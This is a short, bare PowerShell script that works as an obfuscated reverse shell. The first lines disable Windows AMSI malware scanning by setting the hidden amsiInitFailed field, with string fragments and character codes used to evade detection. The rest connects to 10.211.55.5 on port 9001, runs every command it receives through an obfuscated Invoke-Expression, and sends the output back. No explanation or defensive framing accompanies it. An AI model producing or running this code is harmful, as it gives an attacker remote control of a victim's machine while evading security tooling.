
$a = [Ref].Assembly.GetType('System.Management.Automation.' + [char]65 + [char]109 + [char]115 + [char]105 + 'Utils')
$b = $a.GetField('amsi' + 'Init' + 'Failed', 'NonPublic,Static')
$b.SetValue($null, $true)


$i = "10.211.55.5"
$p = 9001

$t = [System.Net.Sockets.TcpClient]::new($i, $p)
$s = $t.GetStream()
$m = New-Object Byte[] 65535


$exec = 'I' + 'E' + 'X'
While(($len = $s.Read($m, 0, $m.Length)) -ne 0) {
    $d = [System.Text.Encoding]::ASCII.GetString($m, 0, $len)
    

    $res = try {
        & (Get-Alias $exec) $d 2>&1 | Out-String
    } catch {
        $_.Exception.Message
    }
    
   
    $send = [System.Text.Encoding]::ASCII.GetBytes($res + " ")
    $s.Write($send, 0, $send.Length)
}
